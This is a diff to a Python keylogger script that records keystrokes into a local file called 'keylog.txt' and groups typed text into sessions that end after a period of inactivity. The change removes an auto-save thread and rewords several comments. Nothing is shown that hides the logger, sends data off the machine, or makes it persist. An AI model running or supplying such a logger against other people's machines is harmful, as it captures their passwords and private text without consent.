@@ -4,8 +4,7 @@ import threading
 
 # --- CONFIG ---
 LOG_FILE = "keylog.txt"
-INACTIVITY_LIMIT = 10      # seconds
-AUTO_SAVE_INTERVAL = 15    # seconds (safety save)
+INACTIVITY_LIMIT = 10  # seconds
 
 # --- STATE ---
 current_text = ""
@@ -52,7 +51,7 @@ def save_session():
     if current_text.strip() == "":
         return
 
-    # Filter noise
+    # Filter noise (very short inputs)
     if len(current_text.strip()) < 2:
         current_text = ""
         session_active = False
@@ -70,7 +69,7 @@ def save_session():
     with open(LOG_FILE, "a") as f:
         f.write(log_entry)
 
-    # Reset
+    # Reset session
     current_text = ""
     session_active = False
 
@@ -86,21 +85,10 @@ def monitor_inactivity():
         time.sleep(1)
 
 
-# --- AUTO SAVE (CRASH PROTECTION) ---
-def auto_save():
-    while True:
-        time.sleep(AUTO_SAVE_INTERVAL)
-        if session_active and current_text.strip():
-            # temporary save without ending session
-            with open(LOG_FILE, "a") as f:
-                f.write(f"[AUTO-SAVE] {current_text}\n")
-
-
 # --- MAIN ---
 if __name__ == "__main__":
-    # Start background threads
+    # Start background thread
     threading.Thread(target=monitor_inactivity, daemon=True).start()
-    threading.Thread(target=auto_save, daemon=True).start()
 
     try:
         with keyboard.Listener(on_press=on_press) as listener:
